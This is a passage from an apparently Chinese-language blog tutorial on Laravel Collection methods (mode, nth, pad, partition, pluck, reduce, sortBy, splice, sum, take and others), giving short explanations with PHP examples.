1</span></span><br></pre></td></tr></table></figure><h3 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h3><p>返回指定键的众数值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>])-&gt;mode();    <span class="comment">// [1]</span></span><br></pre></td></tr></table></figure><h3 id="nth"><a href="#nth" class="headerlink" title="nth"></a>nth</h3><p>每隔n个元素取一个元素组成一个新的集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>]);</span><br><span class="line">$collection-&gt;nth(<span class="number">4</span>);    <span class="comment">// ['a', 'e']</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二个参数可以作为偏移位置 </span></span><br><span class="line">$collection-&gt;nth(<span class="number">4</span>, <span class="number">1</span>); <span class="comment">// ['b', 'f']</span></span><br></pre></td></tr></table></figure><h3 id="only"><a href="#only" class="headerlink" title="only"></a>only</h3><p>返回集合中给定键的所有项目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'product_id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>, <span class="string">'discount'</span> =&gt; <span class="keyword">false</span>]);</span><br><span class="line">$filtered = $collection-&gt;only([<span class="string">'product_id'</span>, <span class="string">'name'</span>]);</span><br><span class="line">$filtered-&gt;all();     <span class="comment">// ['product_id' =&gt; 1, 'name' =&gt; 'Desk']</span></span><br></pre></td></tr></table></figure><h3 id="pad"><a href="#pad" class="headerlink" title="pad"></a>pad</h3><p>将给定值填充数组直到达到指定的最大长度。该方法和 PHP 函数 array_pad 类似。</p><p>如果你想要把数据填充到左侧，需要指定一个负值长度，如果指定长度绝对值小于等于数组长度那么将不会做任何填充。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>]);</span><br><span class="line"></span><br><span class="line">$filtered = $collection-&gt;pad(<span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$filtered-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ['A', 'B', 'C', 0, 0]</span></span><br><span class="line"></span><br><span class="line">$filtered = $collection-&gt;pad(<span class="number">-5</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$filtered-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">// [0, 0, 'A', 'B', 'C']</span></span><br></pre></td></tr></table></figure><h3 id="partition"><a href="#partition" class="headerlink" title="partition"></a>partition</h3><p>配合list()方法区分回调函数满足和不满足的数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>($underThree, $equalOrAboveThree) = $collection-&gt;partition(<span class="function"><span class="keyword">function</span> <span class="params">($i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $i &lt; <span class="number">3</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$underThree-&gt;all();     <span class="comment">// [1, 2]</span></span><br><span class="line">$equalOrAboveThree-&gt;all();    <span class="comment">// [3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure><h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h3><p>将集合传给给定的回调并返回结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection &#x3D; collect([1, 2, 3]);</span><br><span class="line">$piped &#x3D; $collection-&gt;pipe(function ($collection) &#123;</span><br><span class="line">    return $collection-&gt;sum();</span><br><span class="line">&#125;); &#x2F;&#x2F; 6</span><br></pre></td></tr></table></figure><h3 id="pluck"><a href="#pluck" class="headerlink" title="pluck"></a>pluck</h3><p>获取集合中给定键对应的所有值。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'product_id'</span> =&gt; <span class="string">'prod-100'</span>, <span class="string">'name'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">"id"</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'product_id'</span> =&gt; <span class="string">'prod-200'</span>, <span class="string">'name'</span> =&gt; <span class="string">'Chair'</span>, <span class="string">"id"</span> =&gt; <span class="number">2</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$plucked = $collection-&gt;pluck(<span class="string">'name'</span>);</span><br><span class="line">$plucked-&gt;all();    <span class="comment">// ['Desk', 'Chair']</span></span><br></pre></td></tr></table></figure><p>还可以传入第二个参数作为键值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$plucked &#x3D; $collection-&gt;pluck(&#39;name&#39;, &quot;id&quot;);</span><br><span class="line">$plucked-&gt;all();    &#x2F;&#x2F; [1 &#x3D;&gt; &#39;Desk&#39;, 2 &#x3D;&gt; &#39;Chair&#39;]</span><br></pre></td></tr></table></figure><h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>移除并返回集合中的最后一个项目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;pop();     <span class="comment">// 5</span></span><br><span class="line">$collection-&gt;all();     <span class="comment">// [1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure><h3 id="prepend"><a href="#prepend" class="headerlink" title="prepend"></a>prepend</h3><p>将给定的值添加到集合的开头。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;prepend(<span class="number">99</span>);</span><br><span class="line">$collection-&gt;all();     <span class="comment">// [99, 1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><p>如果是关联数组，也可以传入第二个参数作为键值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'one'</span> =&gt; <span class="number">1</span>, <span class="string">'two'</span> =&gt; <span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;prepend(<span class="number">0</span>, <span class="string">'zero'</span>);</span><br><span class="line">$collection-&gt;all();       <span class="comment">// ['zero' =&gt; 0, 'one' =&gt; 1, 'two' =&gt; 2]</span></span><br></pre></td></tr></table></figure><h3 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h3><p>把给定键对应的值从集合中移除并返回。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'product_id'</span> =&gt; <span class="string">'prod-100'</span>, <span class="string">'name'</span> =&gt; <span class="string">'Desk'</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;pull(<span class="string">'name'</span>);    <span class="comment">// 'Desk'</span></span><br><span class="line">$collection-&gt;all();           <span class="comment">// ['product_id' =&gt; 'prod-100']</span></span><br></pre></td></tr></table></figure><h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>把给定值添加到集合的末尾。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;push(<span class="number">5</span>);</span><br><span class="line">$collection-&gt;all();       <span class="comment">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><h3 id="put"><a href="#put" class="headerlink" title="put"></a>put</h3><p>在集合内设置给定的键值对。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'product_id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'Desk'</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;put(<span class="string">'price'</span>, <span class="number">100</span>);</span><br><span class="line">$collection-&gt;all();       <span class="comment">// ['product_id' =&gt; 1, 'name' =&gt; 'Desk', 'price' =&gt; 100]</span></span><br></pre></td></tr></table></figure><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><p>从集合中返回一个随机项。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line">$collection-&gt;random();      <span class="comment">// 4 - (retrieved randomly)</span></span><br></pre></td></tr></table></figure><p>也可以传入一个整数用来指定需要需要获取的随机项个数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$collection-&gt;random();    <span class="comment">// 2, 3, 5</span></span><br></pre></td></tr></table></figure><h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><p>用于减少集合到单个值，传递每个迭代结果到子迭代。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">$total = $collection-&gt;reduce(<span class="function"><span class="keyword">function</span> <span class="params">($carry, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $carry + $item;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6</span></span><br></pre></td></tr></table></figure><p>在第一次迭代时 $carry 的值是null；不过，你可以通过传递第二个参数到 reduce 来指定其初始值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection-&gt;reduce(<span class="function"><span class="keyword">function</span> <span class="params">($carry, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $carry + $item;</span><br><span class="line">&#125;, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 10</span></span><br></pre></td></tr></table></figure><h3 id="reject"><a href="#reject" class="headerlink" title="reject"></a>reject</h3><p>使用指定的回调过滤集合，该回调应该为所有它想要从结果集合中移除的数据项返回 true。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">$filtered = $collection-&gt;reject(<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $value &gt; <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$filtered-&gt;all();     <span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure><h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h3><p>倒转集合中项目的顺序，并保留原始的键值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>]);</span><br><span class="line"></span><br><span class="line">$reversed = $collection-&gt;reverse();</span><br><span class="line">$reversed-&gt;all();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        4 =&gt; 'e',</span></span><br><span class="line"><span class="comment">        3 =&gt; 'd',</span></span><br><span class="line"><span class="comment">        2 =&gt; 'c',</span></span><br><span class="line"><span class="comment">        1 =&gt; 'b',</span></span><br><span class="line"><span class="comment">        0 =&gt; 'a',</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>搜索给定的值并返回它的键，如果没有找到返回 false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;search(<span class="number">4</span>);   <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>上面的搜索使用的是「宽松」比较，要使用「严格」比较，传递 true 作为第二个参数到该方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$collection-&gt;search(<span class="string">'4'</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>此外，你还可以传递自己的回调来搜索通过真理测试的第一个数据项。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection-&gt;search(<span class="function"><span class="keyword">function</span> <span class="params">($item, $key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $item &gt; <span class="number">5</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h3 id="shift"><a href="#shift" class="headerlink" title="shift"></a>shift</h3><p>移除并返回集合的第一个元素。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;shift();   <span class="comment">// 1</span></span><br><span class="line">$collection-&gt;all();     <span class="comment">// [2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><h3 id="shuffle"><a href="#shuffle" class="headerlink" title="shuffle"></a>shuffle</h3><p>随机排序集合中的项目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$shuffled = $collection-&gt;shuffle();</span><br><span class="line">$shuffled-&gt;all();       <span class="comment">// [3, 2, 5, 1, 4] - (generated randomly)</span></span><br></pre></td></tr></table></figure><h3 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h3><p>从给定索引开始返回集合的一个切片。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]);</span><br><span class="line"></span><br><span class="line">$slice = $collection-&gt;slice(<span class="number">4</span>);</span><br><span class="line">$slice-&gt;all();      <span class="comment">// [5, 6, 7, 8, 9, 10]</span></span><br></pre></td></tr></table></figure><p>与<code>skip()</code> 方法类似。</p><p>如果你想要限制返回切片的尺寸，将尺寸值作为第二个参数传递到该方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$slice = $collection-&gt;slice(<span class="number">4</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">$slice-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">// [5, 6]</span></span><br></pre></td></tr></table></figure><p>返回的切片有新的、数字化索引的键，如果你想要保持原有的键，可以使用 values 方法对它们进行重新索引。</p><h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>保留原数组的键，对集合进行排序。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">$sorted = $collection-&gt;sort();</span><br><span class="line"><span class="comment">// 重置索引</span></span><br><span class="line">$sorted-&gt;values()-&gt;all();       <span class="comment">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><p>如果有更高级的排序需求，可以通过自己的算法将回调函数传递到 <code>sort()</code> 方法。</p><p>如果你需要对嵌套数组或对象进行排序，请参照 <code>sortBy()</code> 和 <code>sortByDesc()</code> 方法。</p><h3 id="sortBy"><a href="#sortBy" class="headerlink" title="sortBy"></a>sortBy</h3><p><code>sortBy</code> 方法将根据指定键对集合进行排序。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">'price'</span> =&gt; <span class="number">200</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Chair'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Bookcase'</span>, <span class="string">'price'</span> =&gt; <span class="number">150</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$sorted = $collection-&gt;sortBy(<span class="string">'price'</span>);</span><br><span class="line"></span><br><span class="line">$sorted-&gt;values()-&gt;all();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        ['name' =&gt; 'Chair', 'price' =&gt; 100],</span></span><br><span class="line"><span class="comment">        ['name' =&gt; 'Bookcase', 'price' =&gt; 150],</span></span><br><span class="line"><span class="comment">        ['name' =&gt; 'Desk', 'price' =&gt; 200],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>可以传递第二个参数作为<a href="https://www.php.net/manual/en/function.sort.php" target="_blank" rel="noopener">排序标志</a>，或者，你可以通过你自己的回调函数来决定如何排序集合的值。</p><h3 id="sortByDesc"><a href="#sortByDesc" class="headerlink" title="sortByDesc"></a>sortByDesc</h3><p>该方法与 <code>sortBy</code> 方法一样，但是会以相反的顺序来对集合进行排序：</p><h3 id="sortKeys"><a href="#sortKeys" class="headerlink" title="sortKeys"></a>sortKeys</h3><p><code>sortKeys</code> 使用关联数组的键来对集合进行排序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    <span class="string">'id'</span> =&gt; <span class="number">22345</span>,</span><br><span class="line">    <span class="string">'first'</span> =&gt; <span class="string">'John'</span>,</span><br><span class="line">    <span class="string">'last'</span> =&gt; <span class="string">'Doe'</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$sorted = $collection-&gt;sortKeys();</span><br><span class="line">$sorted-&gt;all();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        'first' =&gt; 'John',</span></span><br><span class="line"><span class="comment">        'id' =&gt; 22345,</span></span><br><span class="line"><span class="comment">        'last' =&gt; 'Doe',</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="sortKeysDesc"><a href="#sortKeysDesc" class="headerlink" title="sortKeysDesc"></a>sortKeysDesc</h3><p>该方法与 <code>sortKeys</code> 方法一样，但是会以相反的顺序来对集合进行排序。</p><h3 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h3><p>从给定位置开始移除并返回数据项切片。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$chunk = $collection-&gt;splice(<span class="number">2</span>);</span><br><span class="line">$chunk-&gt;all();            <span class="comment">// [3, 4, 5]</span></span><br><span class="line">$collection-&gt;all();       <span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure><p>你可以传递参数来限制返回组块的大小。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$chunk = $collection-&gt;splice(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$chunk-&gt;all();<span class="comment">// [3]</span></span><br><span class="line"></span><br><span class="line">$collection-&gt;all(); <span class="comment">// [1, 2, 4, 5]</span></span><br></pre></td></tr></table></figure><p>此外，你可以传递第三个包含新的数据项的参数来替代从集合中移除的数据项。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$chunk = $collection-&gt;splice(<span class="number">2</span>, <span class="number">1</span>, [<span class="number">10</span>, <span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line">$chunk-&gt;all();<span class="comment">// [3]</span></span><br><span class="line"></span><br><span class="line">$collection-&gt;all();<span class="comment">// [1, 2, 10, 11, 4, 5]</span></span><br></pre></td></tr></table></figure><h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><p>将集合按给定的值拆分。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$groups = $collection-&gt;split(<span class="number">3</span>);</span><br><span class="line">$groups-&gt;all();     <span class="comment">// [[1, 2], [3, 4], [5]]</span></span><br></pre></td></tr></table></figure><h3 id="sum"><a href="#sum" class="headerlink" title="sum"></a>sum</h3><p>返回集合内所有项目的总和。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])-&gt;sum();    <span class="comment">// 15</span></span><br></pre></td></tr></table></figure><p>如果集合包含嵌套数组或对象，应该传递一个键用于判断对哪些值进行求和运算。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'JavaScript: The Good Parts'</span>, <span class="string">'pages'</span> =&gt; <span class="number">176</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'JavaScript: The Definitive Guide'</span>, <span class="string">'pages'</span> =&gt; <span class="number">1096</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;sum(<span class="string">'pages'</span>); <span class="comment">// 1272</span></span><br></pre></td></tr></table></figure><p>此外，你还可以传递自己的回调来判断对哪些值进行求和。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Chair'</span>, <span class="string">'colors'</span> =&gt; [<span class="string">'Black'</span>]],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">'colors'</span> =&gt; [<span class="string">'Black'</span>, <span class="string">'Mahogany'</span>]],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Bookcase'</span>, <span class="string">'colors'</span> =&gt; [<span class="string">'Red'</span>, <span class="string">'Beige'</span>, <span class="string">'Brown'</span>]],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$collection-&gt;sum(<span class="function"><span class="keyword">function</span> <span class="params">($product)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> count($product[<span class="string">'colors'</span>]);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 6</span></span><br></pre></td></tr></table></figure><h3 id="take"><a href="#take" class="headerlink" title="take"></a>take</h3><p>返回给定数量项目的新集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">$chunk = $collection-&gt;take(<span class="number">3</span>);</span><br><span class="line">$chunk-&gt;all();      <span class="comment">// [0, 1, 2]</span></span><br></pre></td></tr></table></figure><p>你还可以传递负数的方式从集合末尾开始获取指定数目的数据项。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 